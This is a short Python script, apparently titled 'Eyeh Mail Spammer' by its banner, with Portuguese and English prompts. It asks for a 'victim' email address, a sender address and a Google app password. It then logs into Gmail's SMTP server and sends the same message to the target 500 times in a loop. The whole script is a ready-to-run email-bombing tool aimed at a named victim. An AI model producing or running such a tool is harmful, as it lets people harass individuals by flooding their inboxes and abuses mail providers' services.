# Importações

import smtplib

# Banner

banner = """
 ______     __  __     ______     __  __                                                                                    
/\  ___\   /\ \_\ \   /\  ___\   /\ \_\ \                                                                                   
\ \  __\   \ \____ \  \ \  __\   \ \  __ \                                                                                  
 \ \_____\  \/\_____\  \ \_____\  \ \_\ \_\                                                                                 
  \/_____/   \/_____/   \/_____/   \/_/\/_/                                                                                 
                                                                                                                            
 __    __     ______     __     __            ______     ______   ______     __    __     __    __     ______     ______    
/\ "-./  \   /\  __ \   /\ \   /\ \          /\  ___\   /\  == \ /\  __ \   /\ "-./  \   /\ "-./  \   /\  ___\   /\  == \   
\ \ \-./\ \  \ \  __ \  \ \ \  \ \ \____     \ \___  \  \ \  _-/ \ \  __ \  \ \ \-./\ \  \ \ \-./\ \  \ \  __\   \ \  __<   
 \ \_\ \ \_\  \ \_\ \_\  \ \_\  \ \_____\     \/\_____\  \ \_\    \ \_\ \_\  \ \_\ \ \_\  \ \_\ \ \_\  \ \_____\  \ \_\ \_\ 
  \/_/  \/_/   \/_/\/_/   \/_/   \/_____/      \/_____/   \/_/     \/_/\/_/   \/_/  \/_/   \/_/  \/_/   \/_____/   \/_/ /_/ 
                                                                                                                           \n
"""
print(banner)

# Destinos

toaddrs = (input("Digite o e-mail da vitima/Enter the victim's email: "))
fromaddrs = (input("Digite o e-mail para a ação/Enter email for action: "))
password = (input("Digite a senha de aplicativo google/Enter google app password: "))

# Digite a sua mensagem

yourmessage = (input("Digite a sua mensagem sem espaços/Enter your message without spaces: "))

if toaddrs == fromaddrs:
    print("Spam destinado a si mesmo/Spam aimed at yourself!")
else:
    print("Spamando para o alvo/Spamming to target!")

# Corpo do e-mail

message = (yourmessage)

# Login com o Servidor SMTP

with smtplib.SMTP('smtp.gmail.com', '587') as smtpserver:
    smtpserver.ehlo()
    smtpserver.starttls()
    smtpserver.ehlo()
    smtpserver.login(fromaddrs, password)

   # Contagem dos e-mails enviados e confirmação

    for i in range(500):
        smtpserver.sendmail(fromaddrs, toaddrs, message)
        print(i, "Successfully sent!")
